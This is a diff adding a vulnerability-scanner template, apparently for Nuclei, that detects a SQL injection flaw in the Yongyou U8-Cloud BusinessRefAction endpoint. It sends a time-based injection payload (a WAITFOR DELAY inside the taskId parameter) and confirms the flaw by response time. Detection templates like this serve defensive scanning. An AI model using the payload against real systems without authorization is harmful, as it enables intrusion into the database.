@@ -1,0 +1,34 @@
+id: poc-yaml-yongyou-u8cloud-businessrefaction-sqli
+info:
+  name: Yongyou U8-Cloud BusinessRefAction SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection, yongyou, u8cloud
+  description: |
+    This template detects a SQL Injection vulnerability in the Yongyou U8-Cloud BusinessRefAction endpoint.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.web.reference.BusinessRefAction&method=getTaskRepTreeRef&taskId=1%27);WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-SQLi-PoC
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "- iUFO"
+          - "当前任务报表"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
